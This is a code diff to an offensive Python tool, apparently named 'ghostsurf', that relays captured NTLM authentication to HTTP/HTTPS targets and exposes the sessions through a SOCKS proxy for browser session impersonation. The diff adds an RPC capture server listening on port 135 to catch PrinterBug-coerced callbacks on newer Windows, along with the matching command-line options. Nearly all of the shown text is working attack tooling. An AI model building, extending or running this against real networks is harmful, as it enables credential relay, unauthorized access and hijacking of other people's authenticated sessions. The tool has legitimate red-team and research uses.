@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # ghostsurf - NTLM Relay Browser Hijacking Tool
 #
-# Captures NTLM auth from any source (SMB, HTTP, WCF, RAW)
+# Captures NTLM auth from any source (SMB, HTTP, WCF, RAW, RPC)
 # Relays to HTTP/HTTPS targets
 # SOCKS proxy for browser session impersonation
 #
@@ -26,19 +26,22 @@ from lib.relay.utils.config import NTLMRelayxConfig, parse_listening_ports
 from lib.relay.servers.socksserver import SOCKS, activeConnections
 from lib.relay.clients.httprelayclient import HTTPRelayClient, HTTPSRelayClient
 
-# Only servers that support SOCKS registration (RPC/WinRM don't, so skip them)
-from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer
+# Capture servers. Each one hands relayed sessions to the SOCKS server through activeConnections.
+# The RPC server catches raw DCERPC callbacks (PrinterBug on Windows 11 22H2+ and Server 2025 only
+# calls back over RPC) and answers the endpoint mapper lookup on 135.
+from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer, RPCRelayServer
 
 # Patch relay server modules to use our vendored activeConnections queue
-# (SMB, HTTP, RAW, and WCF all use activeConnections for SOCKS registration)
 import impacket.examples.ntlmrelayx.servers.smbrelayserver as smb_module
 import impacket.examples.ntlmrelayx.servers.httprelayserver as http_module
 import impacket.examples.ntlmrelayx.servers.rawrelayserver as raw_module
 import impacket.examples.ntlmrelayx.servers.wcfrelayserver as wcf_module
+import impacket.examples.ntlmrelayx.servers.rpcrelayserver as rpc_module
 smb_module.activeConnections = activeConnections
 http_module.activeConnections = activeConnections
 raw_module.activeConnections = activeConnections
 wcf_module.activeConnections = activeConnections
+rpc_module.activeConnections = activeConnections
 
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 
@@ -140,6 +143,8 @@ def start_servers(options, threads):
             c.setListeningPort(options.wcf_port)
         elif server is RAWRelayServer:
             c.setListeningPort(options.raw_port)
+        elif server is RPCRelayServer:
+            c.setListeningPort(options.rpc_port)
 
         s = server(c)
         s.start()
@@ -177,6 +182,7 @@ if __name__ == '__main__':
     serversoptions.add_argument('--no-http-server', action='store_true', help='Disable HTTP server')
     serversoptions.add_argument('--no-wcf-server', action='store_true', help='Disable WCF server')
     serversoptions.add_argument('--no-raw-server', action='store_true', help='Disable RAW server')
+    serversoptions.add_argument('--no-rpc-server', action='store_true', help='Disable RPC server')
 
     # Server ports
     portoptions = parser.add_argument_group("Server ports")
@@ -185,6 +191,7 @@ if __name__ == '__main__':
                              help='HTTP server port(s), comma-separated or range (default: 80)')
     portoptions.add_argument('--wcf-port', type=int, default=9389, help='WCF server port (default: 9389)')
     portoptions.add_argument('--raw-port', type=int, default=6666, help='RAW server port (default: 6666)')
+    portoptions.add_argument('--rpc-port', type=int, default=135, help='RPC server port (default: 135)')
 
     # SOCKS proxy options
     socksoptions = parser.add_argument_group("SOCKS proxy (browser hijacking)")
@@ -255,6 +262,8 @@ if __name__ == '__main__':
         RELAY_SERVERS.append(WCFRelayServer)
     if not options.no_raw_server:
         RELAY_SERVERS.append(RAWRelayServer)
+    if not options.no_rpc_server:
+        RELAY_SERVERS.append(RPCRelayServer)
 
     if not RELAY_SERVERS:
         logging.error("All capture servers disabled. Enable at least one.")
